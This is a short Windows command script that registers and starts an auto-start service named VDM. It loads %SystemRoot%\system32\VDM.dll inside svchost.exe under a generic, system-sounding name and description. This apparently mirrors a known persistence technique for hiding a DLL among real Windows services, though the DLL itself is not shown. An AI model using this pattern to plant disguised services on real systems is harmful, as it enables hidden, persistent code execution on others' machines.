sc create VDM binPath= "%SystemRoot%\system32\svchost.exe -k VDM" type= share start= auto DisplayName= "Virtual Devices Manage"
sc description VDM "Provides management services for virtual devices."
reg add HKLM\SYSTEM\CurrentControlSet\services\VDM\Parameters /v ServiceDll /t REG_EXPAND_SZ /d %SystemRoot%\system32\VDM.dll /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Svchost" /v VDM /t REG_MULTI_SZ /d VDM /f
sc start VDM